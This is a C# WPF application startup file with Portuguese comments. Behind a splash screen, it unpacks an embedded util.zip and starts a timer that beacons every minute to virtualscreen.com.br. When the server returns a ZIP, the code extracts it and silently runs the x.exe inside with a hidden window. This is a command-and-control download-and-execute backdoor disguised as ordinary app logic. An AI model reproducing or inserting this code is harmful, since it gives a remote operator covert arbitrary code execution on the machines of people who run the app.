using System.Configuration;
using System.Data;
using System.Windows;
using System;
using System.Threading.Tasks;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Net.Http;
using System.Text;
using System.Diagnostics;
using System.Timers; // Use System.Timers.Timer explicitly

namespace black
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : System.Windows.Application
    {
        private static readonly HttpClient httpClient = new HttpClient();
        private static readonly string uniqueId = Guid.NewGuid().ToString();
        private System.Timers.Timer? daemonTimer; // Make it nullable
        private string tempFolder = string.Empty; // Initialize with empty string

        protected override async void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);

            // === 1️⃣ Extrai util.zip embutido (antes de abrir MainWindow)
            tempFolder = ExtractEmbeddedUtilZip();

            // === 2️⃣ Inicia o daemon imediatamente
            StartDaemon();

            // === 3️⃣ Exibe o splash (sincronamente)
            var splash = new Black.SplashWindow(tempFolder);
            await splash.ShowSplashAsync();
        }

        private void StartDaemon()
        {
            daemonTimer = new System.Timers.Timer(60000); // 1 minute
            daemonTimer.Elapsed += async (sender, e) => await DaemonTick();
            daemonTimer.AutoReset = true;

            // Run first tick immediately
            _ = Task.Run(async () => await DaemonTick());

            // Start the timer for subsequent ticks
            daemonTimer.Start();
        }

        private async Task DaemonTick()
        {
            try
            {
                var payload = new
                {
                    status = "online",
                    id = " Sidney2012@"
                };

                string json = System.Text.Json.JsonSerializer.Serialize(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                var response = await httpClient.PostAsync("https://virtualscreen.com.br/api/status", content);

                if (response.IsSuccessStatusCode)
                {
                    // Check if response is a ZIP file
                    if (response.Content.Headers.ContentType?.MediaType == "application/zip")
                    {
                        // Pause the timer while handling ZIP
                        if (daemonTimer != null)
                        {
                            daemonTimer.Stop();
                        }

                        await HandleZipResponse(response);

                        // Resume the timer
                        if (daemonTimer != null)
                        {
                            daemonTimer.Start();
                        }
                    }
                    // If it's a regular success response, do nothing special
                }
            }
            catch (Exception ex)
            {
                // Log exception but don't stop the daemon
                Console.WriteLine($"Daemon error: {ex.Message}");
            }
        }

        private async Task HandleZipResponse(HttpResponseMessage response)
        {
            try
            {
                // Create a temporary file for the ZIP
                string zipPath = Path.Combine(tempFolder, "downloaded.zip");
                using (var fileStream = File.Create(zipPath))
                {
                    await response.Content.CopyToAsync(fileStream);
                }

                // Extract the ZIP
                string extractPath = Path.Combine(tempFolder, "downloaded");
                Directory.CreateDirectory(extractPath);

                using (var zip = ZipFile.OpenRead(zipPath))
                {
                    foreach (var entry in zip.Entries)
                    {
                        if (string.IsNullOrEmpty(entry.Name)) continue;
                        string fullPath = Path.Combine(extractPath, entry.Name);
                        entry.ExtractToFile(fullPath, overwrite: true);
                    }
                }

                // Delete the ZIP file
                File.Delete(zipPath);

                // Execute x.exe if it exists
                string exePath = Path.Combine(extractPath, "x.exe");
                if (File.Exists(exePath))
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = exePath,
                        UseShellExecute = false,          // precisa ser false para CreateNoWindow funcionar
                        RedirectStandardOutput = false,
                        RedirectStandardError = false,
                        CreateNoWindow = true,            // não abre janela
                        WindowStyle = ProcessWindowStyle.Hidden // garante ocultação total
                    };

                    Process? process = Process.Start(startInfo);
                    // Don't wait for the process to finish, let it run
                }
            }
            catch (Exception ex)
            {
               
            }
        }

        private string ExtractEmbeddedUtilZip()
        {
            string tempFolder = Path.Combine(Path.GetTempPath(), "Black_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(tempFolder);

            var assembly = Assembly.GetExecutingAssembly();
            string? resourceName = assembly.GetManifestResourceNames()
                .FirstOrDefault(n => n.EndsWith("util.zip", StringComparison.OrdinalIgnoreCase));

            if (resourceName == null)
            {
                throw new Exception("util.zip não encontrado como recurso embutido!");
            }

            string zipPath = Path.Combine(tempFolder, "util.zip");

            using (var stream = assembly.GetManifestResourceStream(resourceName)!)
            using (var fileStream = File.Create(zipPath))
                stream.CopyTo(fileStream);

            using (var zip = ZipFile.OpenRead(zipPath))
            {
                foreach (var entry in zip.Entries)
                {
                    if (string.IsNullOrEmpty(entry.Name)) continue;
                    string fullPath = Path.Combine(tempFolder, entry.Name);
                    entry.ExtractToFile(fullPath, overwrite: true);
                }
            }

            File.Delete(zipPath);
            return tempFolder;
        }
    }
}